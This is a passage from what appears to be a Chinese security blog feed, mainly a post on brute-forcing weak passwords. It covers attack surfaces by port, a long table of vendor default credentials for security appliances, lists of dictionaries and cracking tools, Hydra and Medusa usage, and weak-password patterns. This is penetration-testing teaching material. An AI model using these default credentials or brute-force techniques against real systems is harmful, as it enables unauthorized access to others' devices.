<li><a href="https://github.com/wrmsr/pmem/tree/master/OSXPMem">OSXPMem</a> – 内存取证获取工具</li>
</ul>
<h4 id="f-其他工具"><a href="#f-其他工具" class="headerlink" title="f. 其他工具"></a>f. 其他工具</h4><ul>
<li><a href="https://objective-see.com/products.html">KnockKnock</a> – 扫描持久性对象并将它们上传到 VirusTotal</li>
<li><a href="https://objective-see.com/products.html">KextViewr</a> – 显示所有已加载的 kext，以及它们的签名状态、完整路径、VirusTotal 检测率等</li>
<li><a href="https://objective-see.com/products.html">Dylib Hijack Scanner</a> – 扫描系统周围潜在的 Dylib-Hijackable 应用程序</li>
</ul>
<h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><ul>
<li><a href="https://malwareanalysis.co/">https://malwareanalysis.co/</a></li>
<li><a href="https://github.com/rshipp/awesome-malware-analysis">https://github.com/rshipp/awesome-malware-analysis</a></li>
<li><a href="https://zeltser.com/malicious-software/">https://zeltser.com/malicious-software/</a></li>
</ul>
]]></content>
      <categories>
        <category>样本分析</category>
      </categories>
      <tags>
        <tag>Malware Analysis</tag>
      </tags>
  </entry>
  <entry>
    <title>弱口令爆破姿势</title>
    <url>/posts/10235/</url>
    <content><![CDATA[<center>本文总结各类弱口令漏洞类型及利用方式...</center>

<span id="more"></span>

<h2 id="0x01-攻击面"><a href="#0x01-攻击面" class="headerlink" title="0x01 攻击面"></a>0x01 攻击面</h2><p>弱口令爆破常用端口及服务总结如下：</p>
<table>
<thead>
<tr>
<th align="center">端口</th>
<th align="center">服务</th>
<th align="center">爆破方式</th>
</tr>
</thead>
<tbody><tr>
<td align="center">21</td>
<td align="center">ftp&#x2F;tftp&#x2F;vsftpd文件传输协议</td>
<td align="center">爆破&#x2F;嗅探&#x2F;溢出&#x2F;后门</td>
</tr>
<tr>
<td align="center">22</td>
<td align="center">ssh远程连接</td>
<td align="center">爆破&#x2F;OpenSSH漏洞</td>
</tr>
<tr>
<td align="center">23</td>
<td align="center">Telnet远程连接</td>
<td align="center">爆破&#x2F;嗅探</td>
</tr>
<tr>
<td align="center">25</td>
<td align="center">SMTP邮件服务</td>
<td align="center">邮件伪造</td>
</tr>
<tr>
<td align="center">53</td>
<td align="center">DNS域名解析系统</td>
<td align="center">DNS区域传输&#x2F;劫持&#x2F;缓存投毒&#x2F;欺骗; 利用DNS隧道技术刺透防火墙</td>
</tr>
<tr>
<td align="center">67&#x2F;68</td>
<td align="center">dhcp服务</td>
<td align="center">劫持&#x2F;欺骗</td>
</tr>
<tr>
<td align="center">69</td>
<td align="center">tftp(简单文件传输协议,无认证)</td>
<td align="center">尝试下载目标重要配置文件</td>
</tr>
<tr>
<td align="center">110</td>
<td align="center">pop3</td>
<td align="center">爆破&#x2F;嗅探</td>
</tr>
<tr>
<td align="center">137&#x2F;139</td>
<td align="center">Samba服务</td>
<td align="center">爆破&#x2F;未授权访问&#x2F;远程代码执行</td>
</tr>
<tr>
<td align="center">143</td>
<td align="center">Imap协议</td>
<td align="center">爆破</td>
</tr>
<tr>
<td align="center">161</td>
<td align="center">SNMP协议</td>
<td align="center">爆破&#x2F;搜集目标内网信息</td>
</tr>
<tr>
<td align="center">389</td>
<td align="center">Ldap目录访问协议</td>
<td align="center">注入&#x2F;未授权访问&#x2F;弱口令&#x2F;匿名访问</td>
</tr>
<tr>
<td align="center">445</td>
<td align="center">smb</td>
<td align="center">ms17-010&#x2F;端口溢出</td>
</tr>
<tr>
<td align="center">512&#x2F;513&#x2F;514</td>
<td align="center">Linux Rexec服务</td>
<td align="center">爆破&#x2F;Rlogin登陆</td>
</tr>
<tr>
<td align="center">873</td>
<td align="center">Rsync服务</td>
<td align="center">文件上传&#x2F;匿名访问</td>
</tr>
<tr>
<td align="center">1080</td>
<td align="center">socket</td>
<td align="center">爆破&#x2F;内网渗透</td>
</tr>
<tr>
<td align="center">1099</td>
<td align="center">JAVA RMI</td>
<td align="center">反序列化远程命令执行漏洞</td>
</tr>
<tr>
<td align="center">1194</td>
<td align="center">openvpn</td>
<td align="center">获取vpn账号,进内网</td>
</tr>
<tr>
<td align="center">1352</td>
<td align="center">Lotus domino邮件服务</td>
<td align="center">爆破&#x2F;弱口令&#x2F;信息泄漏</td>
</tr>
<tr>
<td align="center">1433</td>
<td align="center">mssql</td>
<td align="center">爆破&#x2F;注入攻击&#x2F;提权&#x2F;sa弱口令</td>
</tr>
<tr>
<td align="center">1500</td>
<td align="center">ispmanager主机控制面板</td>
<td align="center">弱口令</td>
</tr>
<tr>
<td align="center">1521</td>
<td align="center">oracle</td>
<td align="center">注入攻击&#x2F;TNS爆破&#x2F;弹shell</td>
</tr>
<tr>
<td align="center">1723</td>
<td align="center">pptp</td>
<td align="center">爆破&#x2F;获取vpn账号,进内网</td>
</tr>
<tr>
<td align="center">2049</td>
<td align="center">Nfs服务</td>
<td align="center">配置不当</td>
</tr>
<tr>
<td align="center">2082,2083</td>
<td align="center">cpanel主机管理面板登录</td>
<td align="center">弱口令</td>
</tr>
<tr>
<td align="center">2181</td>
<td align="center">zookeeper服务</td>
<td align="center">未授权访问</td>
</tr>
<tr>
<td align="center">2375</td>
<td align="center">docker remote api</td>
<td align="center">未授权访问</td>
</tr>
<tr>
<td align="center">2601,2604</td>
<td align="center">zebra路由</td>
<td align="center">默认密码zerbra</td>
</tr>
<tr>
<td align="center">3128</td>
<td align="center">squid代理服务</td>
<td align="center">弱口令</td>
</tr>
<tr>
<td align="center">3306</td>
<td align="center">mysql</td>
<td align="center">爆破&#x2F;注入&#x2F;拒绝服务&#x2F;提取</td>
</tr>
<tr>
<td align="center">3389</td>
<td align="center">Rdp远程桌面连接</td>
<td align="center">爆破&#x2F;shift后门&#x2F;ms12-020</td>
</tr>
<tr>
<td align="center">3690</td>
<td align="center">svn服务</td>
<td align="center">svn泄露&#x2F;未授权访问</td>
</tr>
<tr>
<td align="center">4848</td>
<td align="center">GlassFish控制台</td>
<td align="center">爆破&#x2F;认证绕过</td>
</tr>
<tr>
<td align="center">5000</td>
<td align="center">sybase&#x2F;DB2数据库</td>
<td align="center">爆破&#x2F;注入</td>
</tr>
<tr>
<td align="center">5432</td>
<td align="center">postgresql</td>
<td align="center">爆破&#x2F;注入&#x2F;缓冲区溢出</td>
</tr>
<tr>
<td align="center">5632</td>
<td align="center">pcanywhere服务</td>
<td align="center">拒绝服务&#x2F;代码执行</td>
</tr>
<tr>
<td align="center">5900,5901,5902</td>
<td align="center">vnc</td>
<td align="center">弱口令爆破</td>
</tr>
<tr>
<td align="center">5984</td>
<td align="center">CouchDB</td>
<td align="center">未授权访问导致任意指令执行</td>
</tr>
<tr>
<td align="center">6379</td>
<td align="center">Redis数据库</td>
<td align="center">未授权访问&#x2F;爆破</td>
</tr>
<tr>
<td align="center">6443</td>
<td align="center">Kubernetes API Server</td>
<td align="center">未授权访问</td>
</tr>
<tr>
<td align="center">7001&#x2F;7002</td>
<td align="center">weblogic</td>
<td align="center">java反序列化&#x2F;控制台弱口令&#x2F;控制台上传webshell&#x2F;SSRF</td>
</tr>
<tr>
<td align="center">80-89,443</td>
<td align="center">http&#x2F;https</td>
<td align="center">web应用漏洞&#x2F;OpenSSL心脏滴血</td>
</tr>
<tr>
<td align="center">8000</td>
<td align="center">JDWP</td>
<td align="center">远程命令执行漏洞</td>
</tr>
<tr>
<td align="center">8069</td>
<td align="center">zabbix服务</td>
<td align="center">远程命令执行&#x2F;注入</td>
</tr>
<tr>
<td align="center">8080-8089</td>
<td align="center">Jboss&#x2F;Tomcat&#x2F;Jenkins&#x2F;Resin&#x2F;Jetty</td>
<td align="center">控制台弱口令&#x2F;反序列化&#x2F;远程文件读取</td>
</tr>
<tr>
<td align="center">8083&#x2F;8086</td>
<td align="center">influxDB</td>
<td align="center">未授权访问</td>
</tr>
<tr>
<td align="center">8161</td>
<td align="center">ActiveMQ</td>
<td align="center">弱口令&#x2F;任意文件写入&#x2F;反序列化</td>
</tr>
<tr>
<td align="center">9000</td>
<td align="center">fastcgi</td>
<td align="center">远程命令执行</td>
</tr>
<tr>
<td align="center">9080-9081,9090</td>
<td align="center">Websphere控制台</td>
<td align="center">java反序列化&#x2F;弱口令</td>
</tr>
<tr>
<td align="center">9200&#x2F;9300</td>
<td align="center">elasticsearch</td>
<td align="center">未授权访问&#x2F;远程代码执行</td>
</tr>
<tr>
<td align="center">11211</td>
<td align="center">memcached</td>
<td align="center">未授权访问</td>
</tr>
<tr>
<td align="center">27017&#x2F;27018</td>
<td align="center">mongodb</td>
<td align="center">未授权访问&#x2F;爆破</td>
</tr>
<tr>
<td align="center">50000</td>
<td align="center">SAP</td>
<td align="center">远程代码执行</td>
</tr>
<tr>
<td align="center">50070,50030</td>
<td align="center">hadoop</td>
<td align="center">默认端口未授权访问</td>
</tr>
</tbody></table>
<p><em>Refer:</em> <a href="http://www.91ri.org/15441.html">http://www.91ri.org/15441.html</a></p>
<h2 id="0x02-爆破字典"><a href="#0x02-爆破字典" class="headerlink" title="0x02 爆破字典"></a>0x02 爆破字典</h2><h3 id="1-厂商初始口令"><a href="#1-厂商初始口令" class="headerlink" title="1. 厂商初始口令"></a>1. 厂商初始口令</h3><p><strong>网络安全设备</strong></p>
<table>
<thead>
<tr>
<th align="center">设备</th>
<th align="center">默认账号</th>
<th align="center">初始密码</th>
</tr>
</thead>
<tbody><tr>
<td align="center">深信服设备</td>
<td align="center">sangfor</td>
<td align="center">sangfor、sangfor@2019、sangfor@2020</td>
</tr>
<tr>
<td align="center">深信服科技 AD</td>
<td align="center">sangfor</td>
<td align="center">dlanrecover</td>
</tr>
<tr>
<td align="center">深信服负载均衡AD 3.6</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">深信服WAC ( WNS V2.6)</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">深信服VPN</td>
<td align="center">Admin</td>
<td align="center">Admin</td>
</tr>
<tr>
<td align="center">深信服ipsec-VPN (SSL 5.5)</td>
<td align="center">Admin</td>
<td align="center">Admin</td>
</tr>
<tr>
<td align="center">深信服AC6.0</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">SANGFOR防火墙</td>
<td align="center">admin</td>
<td align="center">sangfor</td>
</tr>
<tr>
<td align="center">深信服AF(NGAF V2.2)</td>
<td align="center">admin</td>
<td align="center">sangfor</td>
</tr>
<tr>
<td align="center">深信服NGAF下一代应用防火墙(NGAF V4.3)</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">深信服AD3.9</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">深信服上网行为管理设备数据中心</td>
<td align="center">Admin</td>
<td align="center">密码为空</td>
</tr>
<tr>
<td align="center">SANGFOR_AD_v5.1</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">网御漏洞扫描系统</td>
<td align="center">leadsec</td>
<td align="center">leadsec</td>
</tr>
<tr>
<td align="center">天阗入侵检测与管理系统 V7.0</td>
<td align="center">Admin、Audit、adm</td>
<td align="center">venus70</td>
</tr>
<tr>
<td align="center">天阗入侵检测与管理系统 V6.0</td>
<td align="center">Admin、Audit、adm</td>
<td align="center">venus60</td>
</tr>
<tr>
<td align="center">网御WAF集中控制中心(V3.0R5.0)</td>
<td align="center">admin、audit、adm</td>
<td align="center">leadsec.waf</td>
</tr>
<tr>
<td align="center">联想网御</td>
<td align="center">administrator</td>
<td align="center">administrator</td>
</tr>
<tr>
<td align="center">网御事件服务器</td>
<td align="center">admin</td>
<td align="center">admin123</td>
</tr>
<tr>
<td align="center">联想网御防火墙PowerV</td>
<td align="center">administrator</td>
<td align="center">administrator</td>
</tr>
<tr>
<td align="center">联想网御入侵检测系统</td>
<td align="center">lenovo</td>
<td align="center">default</td>
</tr>
<tr>
<td align="center">网络卫士入侵检测系统</td>
<td align="center">admin</td>
<td align="center">talent</td>
</tr>
<tr>
<td align="center">网御入侵检测系统V3.2.72.0</td>
<td align="center">adm、admin</td>
<td align="center">leadsec32</td>
</tr>
<tr>
<td align="center">联想网御入侵检测系统IDS</td>
<td align="center">root</td>
<td align="center">111111</td>
</tr>
<tr>
<td align="center">联想网御入侵检测系统IDS</td>
<td align="center">admin</td>
<td align="center">admin123</td>
</tr>
<tr>
<td align="center">科来网络回溯分析系统</td>
<td align="center">csadmin</td>
<td align="center">colasoft</td>
</tr>
<tr>
<td align="center">中控考勤机web3.0</td>
<td align="center">administrator</td>
<td align="center">123456</td>
</tr>
<tr>
<td align="center">H3C iMC</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">H3C SecPath系列</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">H3C S5120-SI</td>
<td align="center">test</td>
<td align="center">123</td>
</tr>
<tr>
<td align="center">H3C智能管理中心</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">H3C ER3100</td>
<td align="center">admin</td>
<td align="center">adminer3100</td>
</tr>
<tr>
<td align="center">H3C ER3200</td>
<td align="center">admin</td>
<td align="center">adminer3200</td>
</tr>
<tr>
<td align="center">H3C ER3260</td>
<td align="center">admin</td>
<td align="center">adminer3260</td>
</tr>
<tr>
<td align="center">H3C</td>
<td align="center">admin</td>
<td align="center">adminer</td>
</tr>
<tr>
<td align="center">H3C</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">H3C</td>
<td align="center">admin</td>
<td align="center">h3capadmin</td>
</tr>
<tr>
<td align="center">H3C</td>
<td align="center">h3c</td>
<td align="center">h3c</td>
</tr>
<tr>
<td align="center">360天擎</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">网神防火墙</td>
<td align="center">firewall</td>
<td align="center">firewall</td>
</tr>
<tr>
<td align="center">天融信防火墙NGFW4000</td>
<td align="center">superman</td>
<td align="center">talent</td>
</tr>
<tr>
<td align="center">黑盾防火墙</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">黑盾防火墙</td>
<td align="center">rule、audit</td>
<td align="center">abc123</td>
</tr>
<tr>
<td align="center">华为防火墙</td>
<td align="center">telnetuser</td>
<td align="center">telnetpwd</td>
</tr>
<tr>
<td align="center">华为防火墙</td>
<td align="center">ftpuser</td>
<td align="center">ftppwd</td>
</tr>
<tr>
<td align="center">方正防火墙</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">飞塔防火墙</td>
<td align="center">admin</td>
<td align="center">密码为空</td>
</tr>
<tr>
<td align="center">Juniper_SSG__5防火墙</td>
<td align="center">netscreen</td>
<td align="center">netscreen</td>
</tr>
<tr>
<td align="center">中新金盾硬件防火墙</td>
<td align="center">admin</td>
<td align="center">123</td>
</tr>
<tr>
<td align="center">kill防火墙(冠群金辰)</td>
<td align="center">admin</td>
<td align="center">sys123</td>
</tr>
<tr>
<td align="center">天清汉马USG防火墙</td>
<td align="center">admin</td>
<td align="center">venus.fw</td>
</tr>
<tr>
<td align="center">天清汉马USG防火墙</td>
<td align="center">Audit</td>
<td align="center">venus.audit</td>
</tr>
<tr>
<td align="center">天清汉马USG防火墙</td>
<td align="center">useradmin</td>
<td align="center">venus.user</td>
</tr>
<tr>
<td align="center">阿姆瑞特防火墙</td>
<td align="center">admin</td>
<td align="center">manager</td>
</tr>
<tr>
<td align="center">山石网科</td>
<td align="center">hillstone</td>
<td align="center">hillstone</td>
</tr>
<tr>
<td align="center">绿盟安全审计系统</td>
<td align="center">weboper</td>
<td align="center">weboper</td>
</tr>
<tr>
<td align="center">绿盟安全审计系统</td>
<td align="center">webaudit</td>
<td align="center">webaudit</td>
</tr>
<tr>
<td align="center">绿盟安全审计系统</td>
<td align="center">conadmin</td>
<td align="center">conadmin</td>
</tr>
<tr>
<td align="center">绿盟安全审计系统</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">绿盟安全审计系统</td>
<td align="center">shell</td>
<td align="center">shell</td>
</tr>
<tr>
<td align="center">绿盟产品</td>
<td align="center"></td>
<td align="center">nsfocus123</td>
</tr>
<tr>
<td align="center">TopAudit日志审计系统</td>
<td align="center">superman</td>
<td align="center">talent</td>
</tr>
<tr>
<td align="center">LogBase日志管理综合审计系统</td>
<td align="center">admin</td>
<td align="center">safetybase</td>
</tr>
<tr>
<td align="center">网神SecFox运维安全管理与审计系统</td>
<td align="center">admin</td>
<td align="center">!1fw@2soc#3vpn</td>
</tr>
<tr>
<td align="center">天融信数据库审计系统</td>
<td align="center">superman</td>
<td align="center">telent</td>
</tr>
<tr>
<td align="center">Hillstone安全审计平台</td>
<td align="center">hillstone</td>
<td align="center">hillstone</td>
</tr>
<tr>
<td align="center">网康日志中心</td>
<td align="center">ns25000</td>
<td align="center">ns25000</td>
</tr>
<tr>
<td align="center">网络安全审计系统（中科新业）</td>
<td align="center">admin</td>
<td align="center">123456</td>
</tr>
<tr>
<td align="center">天玥网络安全审计系统</td>
<td align="center">Admin</td>
<td align="center">cyberaudit</td>
</tr>
<tr>
<td align="center">明御WEB应用防火墙</td>
<td align="center">admin</td>
<td align="center">admin、adminadmin</td>
</tr>
<tr>
<td align="center">明御攻防实验室平台</td>
<td align="center">root</td>
<td align="center">123456</td>
</tr>
<tr>
<td align="center">明御安全网关</td>
<td align="center">admin</td>
<td align="center">adminadmin</td>
</tr>
<tr>
<td align="center">明御运维审计与册风险控制系统</td>
<td align="center">admin</td>
<td align="center">1q2w3e</td>
</tr>
<tr>
<td align="center">明御运维审计与册风险控制系统</td>
<td align="center">system、auditor、operator</td>
<td align="center">1q2w3e4r</td>
</tr>
<tr>
<td align="center">明御网站卫士</td>
<td align="center">sysmanager</td>
<td align="center">sysmanager888</td>
</tr>
<tr>
<td align="center">亿邮邮件网关</td>
<td align="center">eyouuser</td>
<td align="center">eyou_admin</td>
</tr>
<tr>
<td align="center">亿邮邮件网关</td>
<td align="center">eyougw</td>
<td align="center">admin@(eyou)</td>
</tr>
<tr>
<td align="center">亿邮邮件网关</td>
<td align="center">admin</td>
<td align="center">+-ccccc</td>
</tr>
<tr>
<td align="center">亿邮邮件网关</td>
<td align="center">admin</td>
<td align="center">cyouadmin</td>
</tr>
<tr>
<td align="center">Websense邮件安全网关</td>
<td align="center">administrator</td>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">梭子鱼邮件存储网关</td>
<td align="center">admin</td>
<td align="center">admin</td>
</tr>
</tbody></table>
<p><em>More:</em> <a href="https://github.com/ihebski/DefaultCreds-cheat-sheet">https://github.com/ihebski/DefaultCreds-cheat-sheet</a></p>
<h3 id="2-爆破字典合集"><a href="#2-爆破字典合集" class="headerlink" title="2. 爆破字典合集"></a>2. 爆破字典合集</h3><ul>
<li><p><a href="https://weakpass.com/">Weakpass</a> <em>多种类型的爆破字典合集</em></p>
</li>
<li><p><a href="https://github.com/TheKingOfDuck/fuzzDicts">fuzzDicts</a> <em>Web Pentesting Fuzz字典，适用于中国环境</em></p>
</li>
<li><p><a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">SecLists-Passwords</a> <em>包含众多密码列表的字典合集</em></p>
</li>
<li><p><a href="https://github.com/ihebski/DefaultCreds-cheat-sheet">Default Credentials Cheat Sheet</a> <em>网络及安全设备默认口令</em></p>
</li>
<li><p><a href="https://freerainbowtables.com/">Free Rainbow Tables</a> <em>基于彩虹表的字典合集</em></p>
</li>
<li><p><a href="https://project-rainbowcrack.com/table.htm">List of Rainbow Tables</a>  <em>基于彩虹表的字典合集</em></p>
</li>
</ul>
<h3 id="3-字典生成工具"><a href="#3-字典生成工具" class="headerlink" title="3. 字典生成工具"></a>3. 字典生成工具</h3><ul>
<li><p><a href="https://github.com/LandGrey/pydictor">pydictor</a> <em>一款强大用于暴力破解的字典生成器</em></p>
</li>
<li><p><a href="https://github.com/Mebus/cupp">CUPP</a> <em>依据个人信息生成专属字典</em></p>
</li>
<li><p><a href="https://github.com/digininja/CeWL">CeWL</a> <em>通过收集企业信息生成专属字典</em></p>
</li>
</ul>
<h2 id="0x03-爆破实战"><a href="#0x03-爆破实战" class="headerlink" title="0x03 爆破实战"></a>0x03 爆破实战</h2><h3 id="1-爆破工具"><a href="#1-爆破工具" class="headerlink" title="1. 爆破工具"></a>1. 爆破工具</h3><ul>
<li><p><a href="https://github.com/vanhauser-thc/thc-hydra">Hydra</a> <em>在线开源密码破解工具，支持多种协议类型及不同形式的WEB表单认证破解</em></p>
</li>
<li><p><a href="http://foofus.net/goons/jmk/tools">Medusa</a> <em>在线开源密码破解工具，支持多种协议，稳定性较高</em></p>
</li>
<li><p><a href="https://github.com/nmap/ncrack">ncrack</a> <em>由nmap项目共同维护的在线密码破解工具，速度和稳定性较高</em></p>
</li>
<li><p><a href="https://github.com/galkan/crowbar">crowbar</a> <em>在线密码破解工具，支持OpenVPN以及基于密钥方式身份认证的SSH、VNC服务</em></p>
</li>
<li><p><a href="https://github.com/x90skysn3k/brutespray">BruteSpray</a> <em>可自动读取和解析nmap的扫描报告，并从中识别出可进行密码破解的服务类型</em></p>
</li>
<li><p><a href="https://github.com/netxfly/x-crack">x-crack</a> <em>一款基于Go语言的常见服务弱口令扫描器</em></p>
</li>
<li><p><a href="https://github.com/openwall/john">John the Ripper</a> <em>离线密码破解工具，可自动识别并解密200多种加密算法和应用</em></p>
</li>
<li><p><a href="https://github.com/hashcat/hashcat">hashcat</a> <em>开源离线密码破解工具，特性全面，速度较快</em></p>
</li>
<li><p><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a> <em>windows系统凭据收集框架，凭据包括账号密码、HASH、证书、令牌、cookie等众多类型信息</em></p>
</li>
<li><p><a href="https://ophcrack.sourceforge.io/">Ophcrack</a> <em>基于彩虹表的免费Windows密码破解程序</em></p>
</li>
<li><p><a href="http://project-rainbowcrack.com/">RainbowCrack</a> <em>可生成用于密码破解的彩虹表</em></p>
</li>
</ul>
<h3 id="2-在线爆破"><a href="#2-在线爆破" class="headerlink" title="2. 在线爆破"></a>2. 在线爆破</h3><h4 id="a-Hydra"><a href="#a-Hydra" class="headerlink" title="a. Hydra"></a>a. Hydra</h4><p><strong>安装</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git clone https://github.com/vanhauser-thc/thc-hydra.git</span><br><span class="line"></span><br><span class="line">$ cd thc-hydra</span><br><span class="line"></span><br><span class="line">$ ./configure &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p><strong>常用参数</strong></p>
<table>
<thead>
<tr>
<th>选项</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>-l</td>
<td>指定单个用户名，适合在知道用户名爆破用户名密码时使用</td>
</tr>
<tr>
<td>-L</td>
<td>指定多个用户名，参数值为存储用户名的文件的路径</td>
</tr>
<tr>
<td>-p</td>
<td>指定单个密码，适合在知道密码爆破用户名时使用</td>
</tr>
<tr>
<td>-P</td>
<td>指定多个密码，参数值为存贮密码的文件(通常称为字典)的路径</td>
</tr>
<tr>
<td>-C</td>
<td>当用户名和密码存储到一个文件时使用此参数。字典文件存储的格式必须为 “用户名:密码” 的格式</td>
</tr>
<tr>
<td>-M</td>
<td>指定多个攻击目标，此参数为存储攻击目标的文件的路径，列表文件存储格式必须为”地址:端口”</td>
</tr>
<tr>
<td>-t</td>
<td>指定爆破时的任务数量(线程数)，默认为16</td>
</tr>
<tr>
<td>-s</td>
<td>指定端口，适用于攻击目标端口非默认的情况</td>
</tr>
<tr>
<td>-S</td>
<td>指定爆破时使用 SSL 连接</td>
</tr>
<tr>
<td>-R</td>
<td>继续从上一次爆破进度上继续爆破</td>
</tr>
<tr>
<td>-v</td>
<td>显示爆破的详细信息</td>
</tr>
<tr>
<td>-f</td>
<td>一旦爆破成功一个就停止爆破</td>
</tr>
</tbody></table>
<h4 id="b-Medusa"><a href="#b-Medusa" class="headerlink" title="b. Medusa"></a>b. Medusa</h4><p><strong>安装</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ yum -y install libssh2-devel libssh2-devel libtool libtool-ltdl libtool-ltdl-devel</span><br><span class="line"></span><br><span class="line">$ yum groupinstall -y &#x27;development tools&#x27;</span><br><span class="line"></span><br><span class="line">$ wget http://foofus.net/goons/jmk/tools/medusa-2.2.tar.gz</span><br><span class="line"></span><br><span class="line">$ tar zxvf medusa-2.2.tar.gz &amp;&amp; cd medusa-2.2</span><br><span class="line"></span><br><span class="line">$ ./configure &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p><strong>语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]</span><br></pre></td></tr></table></figure>

<p><strong>参数选项</strong></p>
<table>
<thead>
<tr>
<th>选项</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>-h [TEXT]</td>
<td>目标主机名称或者IP地址</td>
</tr>
<tr>
<td>-H [FILE]</td>
<td>包含目标主机名称或者IP地址文件</td>
</tr>
<tr>
<td>-u [TEXT]</td>
<td>测试的用户名</td>
</tr>
<tr>
<td>-U [FILE]</td>
<td>包含测试的用户名文件</td>
</tr>
<tr>
<td>-p [TEXT]</td>
<td>测试的密码</td>
</tr>
<tr>
<td>-P [FILE]</td>
<td>包含测试的密码文件</td>
</tr>
<tr>
<td>-C [FILE]</td>
<td>组合条目文件</td>
</tr>
<tr>
<td>-O [FILE]</td>
<td>日志信息文件</td>
</tr>
<tr>
<td>-e [n&#x2F;s&#x2F;ns]</td>
<td>n代表空密码，s代表为密码与用户名相同</td>
</tr>
<tr>
<td>-M [TEXT]</td>
<td>模块执行名称</td>
</tr>
<tr>
<td>-m [TEXT]</td>
<td>传递参数到模块</td>
</tr>
<tr>
<td>-d</td>
<td>显示所有的模块名称</td>
</tr>
<tr>
<td>-n [NUM]</td>
<td>使用非默认Tcp端口</td>
</tr>
<tr>
<td>-s</td>
<td>启用SSL</td>
</tr>
<tr>
<td>-r [NUM]</td>
<td>重试间隔时间，默认为3秒</td>
</tr>
<tr>
<td>-t [NUM]</td>
<td>设定线程数量</td>
</tr>
<tr>
<td>-T</td>
<td>同时测试的主机总数</td>
</tr>
<tr>
<td>-L</td>
<td>并行化，每个用户使用一个线程</td>
</tr>
<tr>
<td>-f</td>
<td>在任何主机上找到第一个账号&#x2F;密码后，停止破解</td>
</tr>
<tr>
<td>-F</td>
<td>在任何主机上找到第一个有效的用户名&#x2F;密码后停止审计</td>
</tr>
<tr>
<td>-q</td>
<td>显示模块的使用信息</td>
</tr>
<tr>
<td>-v [NUM]</td>
<td>详细级别（0-6）</td>
</tr>
<tr>
<td>-w [NUM]</td>
<td>错误调试级别（0-10）</td>
</tr>
<tr>
<td>-V</td>
<td>显示版本</td>
</tr>
<tr>
<td>-Z [TEXT]</td>
<td>继续上一次扫描</td>
</tr>
</tbody></table>
<h3 id="3-离线爆破"><a href="#3-离线爆破" class="headerlink" title="3. 离线爆破"></a>3. 离线爆破</h3><h4 id="a-John-the-Ripper"><a href="#a-John-the-Ripper" class="headerlink" title="a. John the Ripper"></a>a. John the Ripper</h4><p><strong>安装</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ wget https://www.openwall.com/john/k/john-1.9.0.tar.gz</span><br><span class="line"></span><br><span class="line">$ tar zxvf john-1.9.0.tar.gz &amp;&amp; cd john-1.9.0</span><br><span class="line"></span><br><span class="line">$ make &amp;&amp; make clean linux-x86-64</span><br><span class="line"></span><br><span class="line">$ alias john=&#x27;/usr/local/john-1.9.0/run/john&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="b-hashcat"><a href="#b-hashcat" class="headerlink" title="b. hashcat"></a>b. hashcat</h4><p><strong>安装</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ wget https://hashcat.net/files/hashcat-6.1.1.tar.gz</span><br><span class="line"></span><br><span class="line">$ tar zxvf hashcat-6.1.1.tar.gz</span><br><span class="line"></span><br><span class="line">$ make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<h2 id="0x04-防御加固"><a href="#0x04-防御加固" class="headerlink" title="0x04 防御加固"></a>0x04 防御加固</h2><h3 id="1-缺陷总结"><a href="#1-缺陷总结" class="headerlink" title="1. 缺陷总结"></a>1. 缺陷总结</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 公共弱口令，出现频率比较高的弱口令</span><br><span class="line"></span><br><span class="line">(2) 数字或字母连排或混排，键盘字母连排</span><br><span class="line"></span><br><span class="line">(3) 默认密码，网络设备、系统组件等默认初始化弱口令</span><br><span class="line"></span><br><span class="line">(4) 生日，姓名+生日（利用社工非常容易被破解）</span><br><span class="line"></span><br><span class="line">(5) 短语密码（如：5201314，love1314等）</span><br></pre></td></tr></table></figure>

